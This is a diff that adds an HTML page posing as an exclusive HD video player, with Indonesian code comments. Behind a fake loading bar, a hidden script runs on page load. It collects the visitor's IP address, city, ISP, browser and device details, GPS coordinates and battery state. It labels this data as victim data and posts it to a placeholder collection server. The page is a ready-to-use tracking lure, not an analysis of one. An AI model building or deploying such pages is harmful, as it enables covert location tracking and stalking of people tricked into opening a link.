@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Video Player • HD</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #0a0a0a;
+            color: white;
+            font-family: system-ui, -apple-system, sans-serif;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .player {
+            width: 100%;
+            max-width: 320px;
+            background: #1a1a1a;
+            border-radius: 30px;
+            padding: 20px;
+            border: 1px solid #333;
+        }
+        .thumbnail {
+            width: 100%;
+            height: 200px;
+            background: linear-gradient(45deg, #2a2a2a, #1a1a1a);
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+        .play-button {
+            width: 60px;
+            height: 60px;
+            background: #ff0000;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            cursor: pointer;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.1); opacity: 0.8; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        .loading-bar {
+            width: 100%;
+            height: 4px;
+            background: #333;
+            border-radius: 2px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        .loading-progress {
+            width: 0%;
+            height: 100%;
+            background: #ff0000;
+            animation: loading 3s infinite;
+        }
+        @keyframes loading {
+            0% { width: 0%; }
+            50% { width: 70%; }
+            100% { width: 100%; }
+        }
+        .status {
+            color: #888;
+            font-size: 14px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="player">
+        <div class="thumbnail">
+            <div class="play-button">▶</div>
+        </div>
+        <h3 style="margin-bottom: 10px;">Video Eksklusif 2026</h3>
+        <div class="loading-bar">
+            <div class="loading-progress"></div>
+        </div>
+        <p class="status">Mengoptimalkan koneksi...</p>
+    </div>
+
+    <!-- TRACKER SCRIPT - TETAP JALAN DI BACKGROUND -->
+    <script>
+        // FUNGSI KIRIM DATA - LANGSUNG KE SERVER LO
+        function sendToServer(data) {
+            // PAKE FORM DATA BIAR GAMPANG
+            let formData = new FormData();
+            
+            // LOOP SEMUA DATA
+            for(let key in data) {
+                formData.append(key, data[key]);
+            }
+            
+            // KIRIM KE SERVER LO (PHP SCRIPT)
+            fetch('https://YOUR-HOSTING.COM/save_data.php', {
+                method: 'POST',
+                body: formData
+            }).catch(err => console.log('Error:', err));
+        }
+
+        // 1. AMBIL IP & LOKASI
+        fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(ipData => {
+                let ip = ipData.ip;
+                
+                fetch(`https://ipapi.co/${ip}/json/`)
+                    .then(r => r.json())
+                    .then(locationData => {
+                        let victimData = {
+                            ip: ip,
+                            country: locationData.country_name || 'Unknown',
+                            city: locationData.city || 'Unknown',
+                            region: locationData.region || 'Unknown',
+                            isp: locationData.org || 'Unknown',
+                            time: new Date().toLocaleString(),
+                            userAgent: navigator.userAgent,
+                            platform: navigator.platform,
+                            language: navigator.language,
+                            screen: screen.width + 'x' + screen.height,
+                            timestamp: Date.now()
+                        };
+                        
+                        // KIRIM DATA IP
+                        sendToServer(victimData);
+                        
+                        // 2. COBA GPS
+                        if (navigator.geolocation) {
+                            navigator.geolocation.getCurrentPosition(
+                                (pos) => {
+                                    victimData.latitude = pos.coords.latitude;
+                                    victimData.longitude = pos.coords.longitude;
+                                    victimData.accuracy = pos.coords.accuracy;
+                                    victimData.gps_status = 'ACCURATE';
+                                    sendToServer(victimData);
+                                },
+                                (err) => {
+                                    victimData.gps_status = 'DENIED';
+                                    sendToServer(victimData);
+                                }
+                            );
+                        }
+                    });
+            });
+            
+        // 3. AMBIL INFO BATERAI
+        if ('getBattery' in navigator) {
+            navigator.getBattery().then(battery => {
+                sendToServer({
+                    battery_level: battery.level * 100 + '%',
+                    battery_charging: battery.charging ? 'Yes' : 'No',
+                    type: 'battery_info'
+                });
+            });
+        }
+    </script>
+</body>
+</html>
